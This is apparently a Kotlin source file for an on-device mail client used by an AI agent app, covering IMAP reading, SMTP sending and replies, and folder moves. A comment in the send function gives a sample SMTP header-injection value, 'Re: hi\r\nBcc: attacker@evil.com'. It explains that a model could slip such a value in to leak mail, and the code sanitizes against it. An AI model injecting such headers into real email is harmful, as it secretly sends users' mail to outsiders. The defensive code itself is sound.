package ru.aiagent.app.integrations

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.Properties
import javax.mail.Flags
import javax.mail.Folder
import javax.mail.Message
import javax.mail.Multipart
import javax.mail.Part
import javax.mail.Session
import javax.mail.Store
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeMessage
import javax.mail.internet.MimeUtility
import com.sun.mail.imap.IMAPFolder

/**
 * Локальный IMAP-клиент (S10, почта). Вход — по «паролю приложения» (генерируется
 * пользователем в настройках его почты). Всё на устройстве: письма НЕ уходят на наш
 * сервер (инвариант ТЗ §7). Поиск/ранжирование — тоже локально (см. EmailTools).
 */
object MailClient {

    data class Mail(
        val uid: Long,
        val from: String,
        val subject: String,
        val date: String,
        val snippet: String, // первые ~400 символов текста — для локального поиска
        val attachments: List<String> = emptyList(), // имена файлов-вложений
    )

    /** IMAP-хост по провайдеру (SSL, порт 993). */
    fun imapHost(provider: String): String = when (provider.lowercase()) {
        "yandex" -> "imap.yandex.ru"
        "mailru", "mail.ru" -> "imap.mail.ru"
        "gmail", "google" -> "imap.gmail.com"
        else -> ""
    }

    /** SMTP-хост по провайдеру (SSL, порт 465). Для нестандартных — imap.* → smtp.*. */
    fun smtpHost(provider: String): String = when (provider.lowercase()) {
        "yandex" -> "smtp.yandex.ru"
        "mailru", "mail.ru" -> "smtp.mail.ru"
        "gmail", "google" -> "smtp.gmail.com"
        else -> ""
    }

    // oauth=true → SMTP-аутентификация XOAUTH2 (secret = access-токен); иначе пароль приложения.
    private fun smtpSession(host: String, oauth: Boolean): Session {
        val props = Properties().apply {
            put("mail.transport.protocol", "smtp")
            put("mail.smtp.host", host)
            put("mail.smtp.port", "465")
            put("mail.smtp.auth", "true")
            put("mail.smtp.ssl.enable", "true")
            put("mail.smtp.connectiontimeout", "15000")
            put("mail.smtp.timeout", "20000")
            if (oauth) {
                put("mail.smtp.auth.mechanisms", "XOAUTH2")
                put("mail.smtp.auth.login.disable", "true")
                put("mail.smtp.auth.plain.disable", "true")
            }
        }
        return Session.getInstance(props)
    }

    /**
     * Отправить письмо с ящика пользователя (S10, §3.10). SMTP напрямую с устройства —
     * тело письма НЕ проходит через наш сервер (инвариант §7). secret — пароль приложения ИЛИ токен.
     */
    suspend fun send(
        smtpHost: String, email: String, secret: String, oauth: Boolean,
        to: String, subject: String, body: String,
    ): Result<Unit> = withContext(Dispatchers.IO) {
        runCatching {
            // Защита от инъекции SMTP-заголовков: модель могла вложить CR/LF в subject/to (напр.
            // "Re: hi\r\nBcc: attacker@evil.com" → скрытая копия письма на чужой адрес, утечка §7).
            // Заголовочные поля не могут содержать перевод строки — вырезаем управляющие символы.
            fun oneLine(s: String) = s.replace(Regex("[\\r\\n]+"), " ").trim()
            val session = smtpSession(smtpHost, oauth)
            val msg = MimeMessage(session).apply {
                setFrom(InternetAddress(email))
                setRecipients(Message.RecipientType.TO, InternetAddress.parse(oneLine(to), false))
                setSubject(oneLine(subject), "UTF-8")
                setText(body, "UTF-8")
                sentDate = java.util.Date()
            }
            val transport = session.getTransport("smtp")
            transport.connect(smtpHost, email, secret)
            try {
                transport.sendMessage(msg, msg.allRecipients)
            } finally {
                transport.close()
            }
        }
    }

    // oauth=true → аутентификация XOAUTH2 (secret = access-токен); иначе обычный пароль приложения.
    private fun session(host: String, oauth: Boolean): Session {
        val props = Properties().apply {
            put("mail.store.protocol", "imaps")
            put("mail.imaps.host", host)
            put("mail.imaps.port", "993")
            put("mail.imaps.ssl.enable", "true")
            put("mail.imaps.connectiontimeout", "15000")
            put("mail.imaps.timeout", "20000")
            if (oauth) {
                put("mail.imaps.auth.mechanisms", "XOAUTH2")
                put("mail.imaps.auth.login.disable", "true")
                put("mail.imaps.auth.plain.disable", "true")
            }
        }
        return Session.getInstance(props)
    }

    /** Проверка входа (для UI подключения). host — IMAP-хост, secret — пароль приложения ИЛИ токен. */
    suspend fun testLogin(host: String, email: String, secret: String, oauth: Boolean): Result<Unit> =
        withContext(Dispatchers.IO) {
            runCatching {
                val store = session(host, oauth).getStore("imaps")
                store.connect(host, email, secret)
                store.close()
            }
        }

    /** Последние [limit] писем из INBOX (свежие сверху) с текстовым сниппетом. */
    suspend fun fetchRecent(host: String, email: String, secret: String, oauth: Boolean, limit: Int): Result<List<Mail>> =
        withContext(Dispatchers.IO) {
            runCatching {
                val store = session(host, oauth).getStore("imaps")
                store.connect(host, email, secret)
                try {
                    val inbox = store.getFolder("INBOX") as IMAPFolder
                    inbox.open(Folder.READ_ONLY)
                    val count = inbox.messageCount
                    if (count == 0) return@runCatching emptyList()
                    val from = maxOf(1, count - limit.coerceIn(1, 100) + 1)
                    val messages = inbox.getMessages(from, count)
                    val out = ArrayList<Mail>(messages.size)
                    for (m in messages.reversed()) { // свежие сверху
                        val uid = inbox.getUID(m)
                        val atts = mutableListOf<Pair<String, Part>>()
                        runCatching { collectAttachmentParts(m, atts) }
                        out += Mail(
                            uid = uid,
                            from = decode(m.from?.firstOrNull()?.toString() ?: ""),
                            subject = decode(m.subject ?: "(без темы)"),
                            date = m.sentDate?.toInstant()?.toString() ?: "",
                            snippet = extractText(m).take(400),
                            attachments = atts.map { it.first },
                        )
                    }
                    inbox.close(false)
                    out
                } finally {
                    store.close()
                }
            }
        }

    /** Полный текст письма по UID (обрезается до [maxChars]). */
    suspend fun readBody(host: String, email: String, secret: String, oauth: Boolean, uid: Long, maxChars: Int = 8000): Result<Mail> =
        withContext(Dispatchers.IO) {
            runCatching {
                val store = session(host, oauth).getStore("imaps")
                store.connect(host, email, secret)
                try {
                    val inbox = store.getFolder("INBOX") as IMAPFolder
                    inbox.open(Folder.READ_ONLY)
                    val m = inbox.getMessageByUID(uid) ?: error("письмо $uid не найдено")
                    val body = extractText(m)
                    val mail = Mail(
                        uid = uid,
                        from = decode(m.from?.firstOrNull()?.toString() ?: ""),
                        subject = decode(m.subject ?: "(без темы)"),
                        date = m.sentDate?.toInstant()?.toString() ?: "",
                        snippet = if (body.length > maxChars) body.take(maxChars) + "\n…(обрезано)" else body,
                    )
                    inbox.close(false)
                    mail
                } finally {
                    store.close()
                }
            }
        }

    /** Скачать байты вложения [filename] из письма [uid]. */
    suspend fun fetchAttachment(
        host: String, email: String, secret: String, oauth: Boolean, uid: Long, filename: String,
    ): Result<ByteArray> = withContext(Dispatchers.IO) {
        runCatching {
            val store = session(host, oauth).getStore("imaps")
            store.connect(host, email, secret)
            try {
                val inbox = store.getFolder("INBOX") as IMAPFolder
                inbox.open(Folder.READ_ONLY)
                val m = inbox.getMessageByUID(uid) ?: error("письмо $uid не найдено")
                val atts = mutableListOf<Pair<String, Part>>()
                collectAttachmentParts(m, atts)
                // Точное совпадение имени, затем по basename — но НЕ подстрока (иначе «a.pdf»
                // матчнет «backup-a.pdf.zip» и вернёт чужое вложение).
                val part = atts.firstOrNull { it.first.equals(filename, true) }?.second
                    ?: atts.firstOrNull { it.first.substringAfterLast('/').equals(filename, true) }?.second
                    ?: error("вложение «$filename» не найдено")
                val bytes = part.inputStream.use { readCapped(it, MAX_ATTACHMENT_BYTES) }
                inbox.close(false)
                bytes
            } finally {
                store.close()
            }
        }
    }

    /** Заголовки исходного письма, нужные для корректного треда ответа (§3.10). */
    private data class OrigHeaders(val messageId: String?, val references: String?, val replyTo: String, val subject: String)

    /**
     * Ответить на письмо [uid] (S10, §3.10). Читает по IMAP только ЗАГОЛОВКИ оригинала
     * (Message-ID/References/From/Subject) — тело наружу не уходит (§7) — и отправляет ответ
     * по SMTP с In-Reply-To/References и темой «Re: …», адресуя отправителю оригинала.
     */
    suspend fun reply(
        imapHost: String, smtpHost: String, email: String, secret: String, oauth: Boolean,
        uid: Long, text: String,
    ): Result<Unit> = withContext(Dispatchers.IO) {
        runCatching {
            // 1) заголовки оригинала по IMAP (тело не трогаем — §7)
            val store = session(imapHost, oauth).getStore("imaps")
            store.connect(imapHost, email, secret)
            val orig = try {
                val inbox = store.getFolder("INBOX") as IMAPFolder
                inbox.open(Folder.READ_ONLY)
                val m = inbox.getMessageByUID(uid) ?: error("письмо $uid не найдено")
                val to = decode((m.replyTo?.firstOrNull() ?: m.from?.firstOrNull())?.toString()
                    ?: error("у письма нет адреса отправителя — некому отвечать"))
                val h = OrigHeaders(
                    messageId = m.getHeader("Message-ID")?.firstOrNull()?.trim(),
                    references = m.getHeader("References")?.firstOrNull()?.trim(),
                    replyTo = to,
                    subject = decode(m.subject ?: "(без темы)"),
                )
                inbox.close(false)
                h
            } finally {
                store.close()
            }
            // 2) отправляем ответ по SMTP с корректным тредингом
            fun oneLine(s: String) = s.replace(Regex("[\\r\\n]+"), " ").trim()
            val session = smtpSession(smtpHost, oauth)
            val reSubject = if (orig.subject.trimStart().startsWith("re:", true)) orig.subject else "Re: ${orig.subject}"
            val msg = MimeMessage(session).apply {
                setFrom(InternetAddress(email))
                setRecipients(Message.RecipientType.TO, InternetAddress.parse(oneLine(orig.replyTo), false))
                setSubject(oneLine(reSubject), "UTF-8")
                orig.messageId?.let { setHeader("In-Reply-To", oneLine(it)) }
                // References = прежняя цепочка + Message-ID оригинала (RFC 5322 §3.6.4)
                listOfNotNull(orig.references, orig.messageId).joinToString(" ").trim()
                    .takeIf { it.isNotBlank() }?.let { setHeader("References", oneLine(it)) }
                setText(text, "UTF-8")
                sentDate = java.util.Date()
            }
            val transport = session.getTransport("smtp")
            transport.connect(smtpHost, email, secret)
            try {
                transport.sendMessage(msg, msg.allRecipients)
            } finally {
                transport.close()
            }
        }
    }

    /**
     * Удалить письмо [uid]: скопировать в корзину (если найдена) и пометить DELETED + expunge;
     * если корзины нет — просто DELETED + expunge. Возвращает человекочитаемое «как удалили».
     */
    suspend fun delete(host: String, email: String, secret: String, oauth: Boolean, uid: Long): Result<String> =
        withContext(Dispatchers.IO) {
            runCatching {
                val store = session(host, oauth).getStore("imaps")
                store.connect(host, email, secret)
                try {
                    val inbox = store.getFolder("INBOX") as IMAPFolder
                    inbox.open(Folder.READ_WRITE)
                    val m = inbox.getMessageByUID(uid) ?: error("письмо $uid не найдено")
                    val trash = findTrashFolder(store)
                    val how = if (trash != null) {
                        inbox.copyMessages(arrayOf(m), trash)
                        "в корзину «${trash.fullName}»"
                    } else {
                        "помечено удалённым (корзина не найдена)"
                    }
                    m.setFlag(Flags.Flag.DELETED, true) // помечаем ДО expunge — на не-UIDPLUS сервере флаг всё равно останется
                    // ТОЧЕЧНЫЙ expunge (UIDPLUS): стираем ТОЛЬКО целевое письмо, а не все \Deleted в INBOX
                    // (folder-wide inbox.expunge() снёс бы чужие письма, помеченные к удалению). close(false) —
                    // без повторного expunge, чтобы флаг на других письмах не привёл к их удалению.
                    // Сервер без UIDPLUS бросает на targeted expunge — это НЕ ошибка: письмо уже помечено \Deleted
                    // и удалится при следующей серверной синхронизации. Folder-wide expunge не делаем (снёс бы чужие).
                    val expunged = runCatching { inbox.expunge(arrayOf(m)) }.isSuccess
                    inbox.close(false)
                    if (expunged) how
                    else "$how; сервер без UIDPLUS — помечено удалённым, фактическое удаление при синхронизации"
                } finally {
                    store.close()
                }
            }
        }

    /**
     * Переместить письмо [uid] в папку [folder] (создаётся, если её нет): copy + DELETED + expunge.
     * Возвращает необязательную пометку (note) — например, если сервер без UIDPLUS не поддержал точечный expunge.
     */
    suspend fun move(host: String, email: String, secret: String, oauth: Boolean, uid: Long, folder: String): Result<String?> =
        withContext(Dispatchers.IO) {
            runCatching {
                val store = session(host, oauth).getStore("imaps")
                store.connect(host, email, secret)
                try {
                    val inbox = store.getFolder("INBOX") as IMAPFolder
                    inbox.open(Folder.READ_WRITE)
                    val m = inbox.getMessageByUID(uid) ?: error("письмо $uid не найдено")
                    val target = resolveOrCreateFolder(store, folder)
                    inbox.copyMessages(arrayOf(m), target)
                    m.setFlag(Flags.Flag.DELETED, true) // помечаем ДО expunge — на не-UIDPLUS сервере флаг останется
                    // ТОЧЕЧНЫЙ expunge (UIDPLUS): убираем из INBOX ТОЛЬКО перемещённое письмо,
                    // не трогая другие письма с флагом \Deleted (folder-wide expunge их бы стёр).
                    // Сервер без UIDPLUS бросает на targeted expunge, но copyMessages УЖЕ выполнен — если пробросить
                    // ошибку, письмо продублируется (копия в папке + оригинал в INBOX). Поэтому НЕ бросаем:
                    // письмо помечено \Deleted и уйдёт из INBOX при следующей серверной синхронизации. Дубля нет.
                    val expunged = runCatching { inbox.expunge(arrayOf(m)) }.isSuccess
                    inbox.close(false)
                    if (expunged) null
                    else "сервер без UIDPLUS — письмо скопировано и помечено удалённым; " +
                        "оригинал уйдёт из INBOX при синхронизации сервера"
                } finally {
                    store.close()
                }
            }
        }

    /** Пометить письмо [uid] прочитанным ([read]=true) или непрочитанным (флаг SEEN). */
    suspend fun setSeen(host: String, email: String, secret: String, oauth: Boolean, uid: Long, read: Boolean): Result<Unit> =
        withContext(Dispatchers.IO) {
            runCatching {
                val store = session(host, oauth).getStore("imaps")
                store.connect(host, email, secret)
                try {
                    val inbox = store.getFolder("INBOX") as IMAPFolder
                    inbox.open(Folder.READ_WRITE)
                    val m = inbox.getMessageByUID(uid) ?: error("письмо $uid не найдено")
                    m.setFlag(Flags.Flag.SEEN, read)
                    inbox.close(false)
                } finally {
                    store.close()
                }
            }
        }

    /** Ищет папку-корзину под разными именами (провайдеры называют её по-разному). null — не нашли. */
    private fun findTrashFolder(store: Store): Folder? {
        val names = listOf("[Gmail]/Trash", "Trash", "Корзина", "Удаленные", "Deleted Items", "Deleted Messages", "Deleted")
        for (n in names) {
            val f = runCatching { store.getFolder(n) }.getOrNull()
            if (f != null && runCatching { f.exists() }.getOrDefault(false)) return f
        }
        return null
    }

    /** Находит папку [name] (точно или под префиксом [Gmail]/), иначе создаёт её. */
    private fun resolveOrCreateFolder(store: Store, name: String): Folder {
        // Имя папки приходит от модели → убираем управляющие символы (защита от инъекции в IMAP-команду).
        val clean = name.replace(Regex("[\\r\\n]+"), " ").trim().ifBlank { error("пустое имя папки") }
        for (cand in listOf(clean, "[Gmail]/$clean")) {
            val f = runCatching { store.getFolder(cand) }.getOrNull()
            if (f != null && runCatching { f.exists() }.getOrDefault(false)) return f
        }
        val f = store.getFolder(clean)
        if (!f.exists() && !f.create(Folder.HOLDS_MESSAGES)) error("не удалось создать папку «$clean»")
        return f
    }

    /** Собирает вложения (имя+часть) из MIME-дерева рекурсивно. */
    private fun collectAttachmentParts(part: Part, out: MutableList<Pair<String, Part>>) {
        if (part.isMimeType("multipart/*")) {
            val mp = part.content as? Multipart ?: return
            for (i in 0 until mp.count) collectAttachmentParts(mp.getBodyPart(i), out)
            return
        }
        val fn = part.fileName ?: return
        val disp = part.disposition
        if (Part.ATTACHMENT.equals(disp, true) || Part.INLINE.equals(disp, true) || disp == null) {
            out += (runCatching { MimeUtility.decodeText(fn) }.getOrDefault(fn)) to part
        }
    }

    private fun decode(s: String): String = runCatching { MimeUtility.decodeText(s) }.getOrDefault(s)

    // Потолок размера вложения: без него readBytes() на 300МБ-вложении (в т.ч. из ФОНОВОГО индексатора,
    // без участия пользователя) даёт OutOfMemoryError → краш. 25 МБ достаточно для документов/сканов.
    private val MAX_ATTACHMENT_BYTES = 25 * 1024 * 1024

    private fun readCapped(input: java.io.InputStream, max: Int): ByteArray {
        val out = java.io.ByteArrayOutputStream()
        val buf = ByteArray(64 * 1024)
        var total = 0
        while (true) {
            val n = input.read(buf); if (n < 0) break
            total += n
            if (total > max) error("вложение слишком большое (> ${max / (1024 * 1024)} МБ)")
            out.write(buf, 0, n)
        }
        return out.toByteArray()
    }

    /** Достаёт текст (предпочтительно text/plain) из MIME-части, рекурсивно. */
    private fun extractText(part: Part): String {
        return try {
            when {
                part.isMimeType("text/plain") -> readCappedText(part)
                part.isMimeType("text/html") -> stripHtml(readCappedText(part))
                part.isMimeType("multipart/*") -> {
                    val mp = part.content as? Multipart ?: return ""
                    // Ищем text/plain, иначе — первый text/*.
                    var html = ""
                    for (i in 0 until mp.count) {
                        val bp = mp.getBodyPart(i)
                        if (bp.isMimeType("text/plain")) return readCappedText(bp)
                        if (bp.isMimeType("multipart/*")) {
                            val nested = extractText(bp)
                            if (nested.isNotBlank()) return nested
                        }
                        if (bp.isMimeType("text/html") && html.isEmpty()) html = stripHtml(readCappedText(bp))
                    }
                    html
                }
                else -> ""
            }
        } catch (_: Throwable) {
            ""
        }.trim()
    }

    /** Потолок тела письма в БАЙТАХ — против OOM: part.content материализует весь body в память,
     *  а сервер/письмо могут прислать гигантский text-part. Читаем поток с лимитом. */
    private const val MAX_BODY_BYTES = 512 * 1024

    /** Читает текстовую MIME-часть ПОТОКОМ с лимитом (а не part.content целиком) и декодирует по её charset. */
    private fun readCappedText(part: Part): String = try {
        val cs = try {
            javax.mail.internet.ContentType(part.contentType).getParameter("charset")
                ?.let { charset(MimeUtility.javaCharset(it)) } ?: Charsets.UTF_8
        } catch (_: Throwable) { Charsets.UTF_8 }
        part.inputStream.use { ins ->
            val out = java.io.ByteArrayOutputStream()
            val buf = ByteArray(8192)
            var total = 0
            while (total < MAX_BODY_BYTES) {
                val n = ins.read(buf); if (n < 0) break
                out.write(buf, 0, minOf(n, MAX_BODY_BYTES - total))
                total += n
            }
            String(out.toByteArray(), cs)
        }
    } catch (_: Throwable) { "" }

    private fun stripHtml(html: String): String =
        html.replace(Regex("(?is)<(script|style).*?>.*?</\\1>"), " ")
            .replace(Regex("(?s)<[^>]+>"), " ")
            .replace(Regex("&nbsp;"), " ")
            .replace(Regex("\\s+"), " ")
            .trim()
}
